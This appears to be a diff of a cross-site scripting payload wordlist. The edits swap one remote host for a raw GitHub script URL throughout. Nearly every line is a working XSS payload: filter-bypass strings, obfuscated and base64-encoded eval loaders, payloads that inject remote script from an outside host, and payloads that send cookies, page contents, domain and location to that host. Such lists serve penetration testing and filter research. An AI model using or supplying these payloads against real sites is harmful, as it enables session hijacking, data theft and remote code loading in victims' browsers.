+<input autofocus onfocus=/*${/*/;{/**/parent['mrifnoc'.split('').reverse().join('')](1)}//><Base/Href=//raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js-->
 '"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=(confirm)(1)>
 '"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=&#x63;onfir\u006d`1`>
 1')"AutoFocus/ContentEditable/OnFocusIn=(confirm)(1)//
@@ -19037,26 +20533,26 @@ JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Script/</textArea/</
 ')"--><Img Src=//xss.krazeplanet.com/1.js OnLoad%0C=import(Src)//
 ')"--><img src=x onerror=(alert)(1)||alert(2)||al\u0065rt(3)>
 ')"--><img src=x onerror=(alert)(1)&&alert(2)&&al\u0065rt(3)>
-"><img/src/onerror=import('//rix4uni.ez.pe')>"@x.com
-013371337;ext=<img/src/onerror=import('//rix4uni.ez.pe')>
+"><img/src/onerror=import('//raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js')>"@x.com
+013371337;ext=<img/src/onerror=import('//raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js')>
 `'"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))//
 `â€™"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
 `â€™"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>
-javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html "onmouseover=/*<svg*/onload=import(/https:\rix4uni.ez.pe\/.source)//>
-`â€™"><svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://rix4uni.ez.pe\';document.body.appendChild(a)')" />
-`â€™"><audio src="x" onerror="var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)">
-`â€™"><body onload="var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)">
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html "onmouseover=/*<svg*/onload=import(/https:\raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js\/.source)//>
+`â€™"><svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js\';document.body.appendChild(a)')" />
+`â€™"><audio src="x" onerror="var a=document.createElement('script');a.src='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js';document.body.appendChild(a)">
+`â€™"><body onload="var a=document.createElement('script');a.src='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js';document.body.appendChild(a)">
 <video><source onerror="eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))">
-<input autofocus onfocus="new Image().src='https://rix4uni.ez.pe/?c='+document.cookie">
+<input autofocus onfocus="new Image().src='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js/?c='+document.cookie">
 <input id='x' onfocus=eval(atob(this.id)) autofocus id=dmVyIGM9bmV3IEltYWdlKCk7Yy5zcmM9J2h0dHBzOi8vcml4NHVuaS5lei5wZS8/Yz0nK2RvY3VtZW50LmNvb2tpZTs=>
-<textarea autofocus onfocus="location='https://rix4uni.ez.pe/?txt='+document.body.innerHTML"></textarea>
-<img src="x" onerror="new Image().src='https://rix4uni.ez.pe/?e='+document.domain">
-<div contenteditable onfocus="fetch('https://rix4uni.ez.pe/?x='+document.location)"></div>
-<svg><a xlink:href="https://rix4uni.ez.pe"><rect onfocus="this.href.baseVal='https://rix4uni.ez.pe?svgfocus='+document.domain" tabindex="1"/></a></svg>
-<video src onerror="fetch('https://rix4uni.ez.pe?videofail='+document.cookie)"></video>
-/*iframe/src*/<iframe/src="<iframe/src=@"/onload=document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe' /*iframe/src*/>
-1')"AutoFocus/ContentEditable/OnFocusIn=(document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe')//
-">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe'></marquee> ></plaintext\></|\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe'>
+<textarea autofocus onfocus="location='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js/?txt='+document.body.innerHTML"></textarea>
+<img src="x" onerror="new Image().src='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js/?e='+document.domain">
+<div contenteditable onfocus="fetch('https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js/?x='+document.location)"></div>
+<svg><a xlink:href="https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js"><rect onfocus="this.href.baseVal='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js?svgfocus='+document.domain" tabindex="1"/></a></svg>
+<video src onerror="fetch('https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js?videofail='+document.cookie)"></video>
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=document.body.appendChild(document.createElement('script')).src='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js' /*iframe/src*/>
+1')"AutoFocus/ContentEditable/OnFocusIn=(document.body.appendChild(document.createElement('script')).src='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js')//
+">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js'></marquee> ></plaintext\></|\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js'>
 JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\76-->
 JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
 "-prompt(8)-"
@@ -28859,7 +30355,7 @@ javascript:\x61\x6c\x65\x72\x74('\x58\x53\x53\x20\x64\x65\x74\x65\x63\x74\x65\x6
 \x22\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x20\x64\x65\x74\x65\x63\x74\x65\x64\x27\x29\x3e
 <input type="text" onfocus="\x61\x6c\x65\x72\x74('\x58\x53\x53\x20\x64\x65\x74\x65\x63\x74\x65\x64')">
 <a href="javascript:\x61\x6c\x65\x72\x74('\x58\x53\x53\x20\x64\x65\x74\x65\x63\x74\x65\x64')">Click me</a>
-">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe'></marquee> ></plaintext\></|\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe'>
+">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js'></marquee> ></plaintext\></|\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://raw.githubusercontent.com/NARKHEDE-VAIBHAV/data/refs/heads/main/xss/xss1.js'>
 <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
 <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
